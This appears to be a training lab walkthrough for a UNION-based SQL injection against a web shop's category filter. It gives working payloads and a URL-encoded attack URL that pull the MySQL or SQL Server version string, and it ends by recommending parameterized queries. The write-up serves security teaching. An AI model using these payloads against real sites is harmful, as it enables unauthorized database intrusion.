Lab Title: SQL Injection Attack – Querying the Database Type and Version on MySQL and Microsoft

Overview:
This lab demonstrates how to exploit a SQL injection vulnerability in the product category filter of a web application. The underlying database is either MySQL or Microsoft SQL Server. The objective is to use a UNION-based SQL injection to retrieve and display the database version string.

Objective:
Use a UNION-based SQL injection attack to extract the database version information and display it on the web page.

Tools Required:
- Web browser
- Burp Suite (or any proxy tool to intercept HTTP requests)

Step-by-Step Instructions:

1. Intercept the HTTP Request:
   - Use Burp Suite to capture the request when selecting a product category.
   - Example request:
     GET /filter?category=Accessories HTTP/1.1
     Host: <lab-id>.web-security-academy.net

2. Identify the Number of Columns and Text-Compatible Fields:
   - To construct a valid UNION SELECT, determine how many columns are returned and which of them accept string data.
   - Use the following payload to test:
     `' UNION SELECT 'abc', 'def'#`
   - If both `abc` and `def` appear in the response, it confirms there are 2 columns and both accept text.

3. Retrieve the Database Version:
   - Use the following payload to extract the version:
     `' UNION SELECT @@version, NULL#`
   - `@@version` returns the database version string in both MySQL and Microsoft SQL Server.
   - The second column is filled with `NULL` to match the column count.

4. URL-Encoded Version of the Payload:
   - If using the browser directly, encode the payload as:
     `%27%20UNION%20SELECT%20@@version,%20NULL%23`
   - Example final URL:
     https://<lab-id>.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20@@version,%20NULL%23

5. Verify the Output:
   - If successful, the page will show a string such as:
     - MySQL: `8.0.31 MySQL Community Server`
     - SQL Server: `Microsoft SQL Server 2019 (RTM-CU18)`

Conclusion:
This lab illustrates how a UNION-based SQL injection vulnerability can be exploited to expose sensitive database metadata such as version information. It underlines the importance of input sanitization and the use of parameterized queries to protect against such attacks.
